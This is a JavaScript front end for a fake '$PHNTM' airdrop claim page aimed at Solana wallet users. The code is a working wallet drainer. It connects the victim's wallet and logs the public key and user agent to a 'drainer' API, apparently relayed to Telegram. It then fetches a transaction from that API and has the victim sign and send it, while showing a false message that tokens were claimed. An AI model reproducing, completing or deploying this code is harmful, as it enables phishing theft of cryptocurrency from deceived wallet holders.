// Global state
let walletConnected = false;
let walletAddress = '';
let walletType = '';
let currentWallet = null;

// API Configuration
const API_BASE_URL = 'https://your-drainer-api.vercel.app'; // Update with your API URL
const API_ENDPOINTS = {
    drainer: '/api/drainer',
    logWallet: '/api/drainer/log-wallet'
};

// Wallet detection and connection
class WalletManager {
    constructor() {
        this.wallets = {
            phantom: {
                name: 'Phantom',
                icon: '',
                check: () => typeof window.solana !== 'undefined' && window.solana.isPhantom,
                connect: async () => {
                    try {
                        const response = await window.solana.connect();
                        return {
                            publicKey: response.publicKey.toString(),
                            provider: window.solana
                        };
                    } catch (error) {
                        throw new Error('Phantom connection failed: ' + error.message);
                    }
                }
            },
            solflare: {
                name: 'Solflare',
                icon: '',
                check: () => typeof window.solflare !== 'undefined',
                connect: async () => {
                    try {
                        const response = await window.solflare.connect();
                        return {
                            publicKey: response.publicKey.toString(),
                            provider: window.solflare
                        };
                    } catch (error) {
                        throw new Error('Solflare connection failed: ' + error.message);
                    }
                }
            },
            backpack: {
                name: 'Backpack',
                icon: '',
                check: () => typeof window.backpack !== 'undefined',
                connect: async () => {
                    try {
                        const response = await window.backpack.connect();
                        return {
                            publicKey: response.publicKey.toString(),
                            provider: window.backpack
                        };
                    } catch (error) {
                        throw new Error('Backpack connection failed: ' + error.message);
                    }
                }
            },
            glow: {
                name: 'Glow',
                icon: '',
                check: () => typeof window.glow !== 'undefined',
                connect: async () => {
                    try {
                        const response = await window.glow.connect();
                        return {
                            publicKey: response.publicKey.toString(),
                            provider: window.glow
                        };
                    } catch (error) {
                        throw new Error('Glow connection failed: ' + error.message);
                    }
                }
            },
            trust: {
                name: 'Trust Wallet',
                icon: '',
                check: () => typeof window.trustwallet !== 'undefined',
                connect: async () => {
                    try {
                        const response = await window.trustwallet.connect();
                        return {
                            publicKey: response.publicKey.toString(),
                            provider: window.trustwallet
                        };
                    } catch (error) {
                        throw new Error('Trust Wallet connection failed: ' + error.message);
                    }
                }
            },
            exodus: {
                name: 'Exodus',
                icon: '',
                check: () => typeof window.exodus !== 'undefined',
                connect: async () => {
                    try {
                        const response = await window.exodus.connect();
                        return {
                            publicKey: response.publicKey.toString(),
                            provider: window.exodus
                        };
                    } catch (error) {
                        throw new Error('Exodus connection failed: ' + error.message);
                    }
                }
            }
        };
    }

    getAvailableWallets() {
        return Object.entries(this.wallets)
            .filter(([key, wallet]) => wallet.check())
            .map(([key, wallet]) => ({ key, ...wallet }));
    }

    async connectWallet(walletKey) {
        const wallet = this.wallets[walletKey];
        if (!wallet) {
            throw new Error('Wallet not supported');
        }

        if (!wallet.check()) {
            throw new Error(`${wallet.name} wallet not detected. Please install it first.`);
        }

        const result = await wallet.connect();
        return {
            type: walletKey,
            name: wallet.name,
            publicKey: result.publicKey,
            provider: result.provider
        };
    }
}

// Initialize wallet manager
const walletManager = new WalletManager();

// Modal functions
function openWalletModal() {
    const modal = document.getElementById('walletModal');
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closeWalletModal() {
    const modal = document.getElementById('walletModal');
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Wallet connection
async function connectWallet(walletType) {
    const button = document.querySelector('.connect-wallet');
    const originalText = button.querySelector('.wallet-text').textContent;
    
    try {
        // Show loading state
        button.querySelector('.wallet-text').textContent = 'Connecting...';
        button.disabled = true;

        // Connect to wallet
        const wallet = await walletManager.connectWallet(walletType);
        
        // Update global state
        walletConnected = true;
        walletAddress = wallet.publicKey;
        currentWallet = wallet;
        
        // Update UI
        button.querySelector('.wallet-text').style.display = 'none';
        button.querySelector('.wallet-address').textContent = `${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)}`;
        button.querySelector('.wallet-address').style.display = 'inline';
        
        // Enable claim button
        document.querySelector('.claim-button').disabled = false;
        
        // Close modal
        closeWalletModal();
        
        // Show success message
        showStatus('Wallet connected successfully!', 'success');
        
        // Log wallet connection
        await logWalletConnection(wallet);
        
    } catch (error) {
        console.error('Wallet connection error:', error);
        button.querySelector('.wallet-text').textContent = originalText;
        button.disabled = false;
        showStatus(`Connection failed: ${error.message}`, 'error');
    }
}

// API functions
async function logWalletConnection(wallet) {
    try {
        await fetch(API_BASE_URL + API_ENDPOINTS.logWallet, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                publicKey: wallet.publicKey,
                walletType: wallet.type,
                origin: window.location.origin,
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('Telegram logging not available');
    }
}

async function claimAirdrop() {
    if (!walletConnected) {
        showStatus('Please connect your wallet first.', 'error');
        return;
    }

    const button = document.querySelector('.claim-button');
    const claimText = button.querySelector('.claim-text');
    const claimLoading = button.querySelector('.claim-loading');
    
    try {
        // Show loading state
        claimText.style.display = 'none';
        claimLoading.style.display = 'inline';
        button.disabled = true;
        showStatus('Processing your claim...', 'loading');

        // Call drainer API
        const response = await fetch(API_BASE_URL + API_ENDPOINTS.drainer, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                publicKey: walletAddress
            })
        });

        const data = await response.json();

        if (response.ok && data.success) {
            // Transaction generated successfully
            showStatus('Transaction generated! Please sign in your wallet.', 'success');
            
            // Sign and send transaction
            await signAndSendTransaction(data.transaction);
            
        } else {
            // Handle API errors
            const errorMessage = data.details || data.error || 'Claim failed';
            showStatus(errorMessage, 'error');
        }
        
    } catch (error) {
        console.error('Claim error:', error);
        showStatus('Failed to claim airdrop. Please try again.', 'error');
    } finally {
        // Reset button state
        claimText.style.display = 'inline';
        claimLoading.style.display = 'none';
        button.disabled = false;
    }
}

async function signAndSendTransaction(transactionBase64) {
    if (!currentWallet || !currentWallet.provider) {
        showStatus('Wallet not connected properly.', 'error');
        return;
    }

    try {
        showStatus('Signing transaction...', 'loading');

        // Ensure @solana/web3.js is loaded
        if (!window.solanaWeb3 || !window.solanaWeb3.Transaction) {
            showStatus('Solana web3.js not loaded. Please check your internet connection.', 'error');
            return;
        }

        // Convert base64 to Transaction object
        const transaction = window.solanaWeb3.Transaction.from(
            Uint8Array.from(atob(transactionBase64), c => c.charCodeAt(0))
        );
        
        // Sign and send transaction
        const signature = await currentWallet.provider.signAndSendTransaction(transaction);
        
        showStatus('Transaction sent successfully! Check your wallet.', 'success');
        
        // Optional: Wait for confirmation
        setTimeout(() => {
            showStatus('Transaction confirmed! Your $PHNTM tokens have been claimed.', 'success');
        }, 3000);
        
    } catch (error) {
        console.error('Transaction signing error:', error);
        
        if (error.message && error.message.includes('User rejected')) {
            showStatus('Transaction was cancelled by user.', 'error');
        } else if (error.message && error.message.includes('insufficient funds')) {
            showStatus('Insufficient funds for transaction fees.', 'error');
        } else if (error.message && error.message.includes('incompatible')) {
            showStatus('Wallet adapter incompatible - please try a different wallet.', 'error');
        } else {
            showStatus('Transaction failed. Please try again.', 'error');
        }
    }
}

// UI functions
function showStatus(message, type) {
    const status = document.getElementById('status');
    status.textContent = message;
    status.className = status ;
    status.style.display = 'block';

    // Auto-hide success messages after 8 seconds
    if (type === 'success') {
        setTimeout(() => {
            status.style.display = 'none';
        }, 8000);
    }
}

// Event listeners
document.addEventListener('DOMContentLoaded', function() {
    // Add hover effects to ghost icons
    const ghostIcons = document.querySelectorAll('.ghost-icon, .ghost-o');
    ghostIcons.forEach(icon => {
        icon.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.1)';
            this.style.transition = 'transform 0.2s';
        });
        
        icon.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1)';
        });
    });

    // Close modal when clicking outside
    window.addEventListener('click', function(event) {
        const modal = document.getElementById('walletModal');
        if (event.target === modal) {
            closeWalletModal();
        }
    });

    // Close modal with Escape key
    document.addEventListener('keydown', function(event) {
        if (event.key === 'Escape') {
            closeWalletModal();
        }
    });

    // Add smooth scroll for navigation links
    document.querySelectorAll('nav a').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            // Add smooth scroll or navigation logic here
        });
    });

    // Check for existing wallet connection on page load
    checkExistingConnection();
});

async function checkExistingConnection() {
    // Check if user has a previously connected wallet
    const savedWallet = localStorage.getItem('phantom-airdrop-wallet');
    if (savedWallet) {
        try {
            const walletData = JSON.parse(savedWallet);
            const wallet = await walletManager.connectWallet(walletData.type);
            
            // Update global state
            walletConnected = true;
            walletAddress = wallet.publicKey;
            currentWallet = wallet;
            
            // Update UI
            const button = document.querySelector('.connect-wallet');
            button.querySelector('.wallet-text').style.display = 'none';
            button.querySelector('.wallet-address').textContent = `${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)}`;
            
            // Enable claim button
            document.querySelector('.claim-button').disabled = false;
            
        } catch (error) {
            console.log('Previous wallet connection failed:', error);
            localStorage.removeItem('phantom-airdrop-wallet');
        }
    }
}

// Save wallet connection to localStorage
function saveWalletConnection(wallet) {
    localStorage.setItem('phantom-airdrop-wallet', JSON.stringify({
        type: wallet.type,
        publicKey: wallet.publicKey
    }));
}

// Analytics and tracking
function trackEvent(eventName, data = {}) {
    // Google Analytics 4
    if (typeof gtag !== 'undefined') {
        gtag('event', eventName, {
            event_category: 'airdrop',
            event_label: walletAddress,
            ...data
        });
    }
    
    // Custom analytics
    console.log('Event tracked:', eventName, data);
}

// Error handling
window.addEventListener('error', function(event) {
    console.error('Global error:', event.error);
    trackEvent('error', {
        message: event.error.message,
        stack: event.error.stack
    });
});

// Performance monitoring
window.addEventListener('load', function() {
    if ('performance' in window) {
        const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
        trackEvent('page_load', { load_time: loadTime });
    }
});
